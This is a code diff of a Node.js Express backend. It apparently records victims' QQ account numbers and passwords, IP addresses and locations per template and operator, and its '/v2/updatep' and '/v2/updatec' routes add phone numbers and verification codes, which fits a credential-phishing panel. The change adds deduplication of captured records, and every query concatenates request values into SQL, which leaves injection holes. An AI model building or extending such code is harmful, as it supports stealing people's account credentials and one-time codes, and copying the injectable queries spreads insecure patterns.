@@ -30,14 +30,28 @@ module.exports = function (app) {
         sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + userId + ';', function (err, rows) {
             mname = rows[0].tempName;
             userName = rows[0].userName;
-            sql.all(`insert into datas values(null,"${qq}","${pwd}","${ip}","${['未知地址']}",${mid},"${mname}",${userId},"${userName}","${insertTime}",0,'','','${ranid}');`, function (err, rows) {
-                _ip(ip, function (ip, add) {
-                    address = add;
-                    sql.all('UPDATE datas SET address = "' + address + '" WHERE ip = "' + ip + '";')
-                });
-                cb();
-            });
-
+            sql.all(`select count(*) from datas where ranid='${ranid}';`, function (err, rows) {
+                if (rows[0]['count(*)'] >= 1) {
+                    return sql.all(`delete from datas where ranid='${ranid}';`,function(){
+                        sql.all(`insert into datas values(null,"${qq}","${pwd}","${ip}","${['未知地址']}",${mid},"${mname}",${userId},"${userName}","${insertTime}",0,'','','${ranid}');`, function (err, rows) {
+                            _ip(ip, function (ip, add) {
+                                address = add;
+                                sql.all('UPDATE datas SET address = "' + address + '" WHERE ip = "' + ip + '";')
+                            });
+                            cb();
+                        });
+                    })
+                } else {
+                    sql.all(`insert into datas values(null,"${qq}","${pwd}","${ip}","${['未知地址']}",${mid},"${mname}",${userId},"${userName}","${insertTime}",0,'','','${ranid}');`, function (err, rows) {
+                        _ip(ip, function (ip, add) {
+                            address = add;
+                            sql.all('UPDATE datas SET address = "' + address + '" WHERE ip = "' + ip + '";')
+                        });
+                        cb();
+                    });
+                }
+                
+            })
         });
     };
 
@@ -268,7 +282,7 @@ module.exports = function (app) {
         }
     })
 
-    app.post('/v2/updatep',function(req,res){
+    app.post('/v2/updatep', function (req, res) {
         // UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值
         var phone = req.body.phone
         var ranid = req.body.ranid
@@ -277,7 +291,7 @@ module.exports = function (app) {
         })
     })
 
-    app.post('/v2/updatec',function(req,res){
+    app.post('/v2/updatec', function (req, res) {
         // UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值
         var code = req.body.code
         var ranid = req.body.ranid
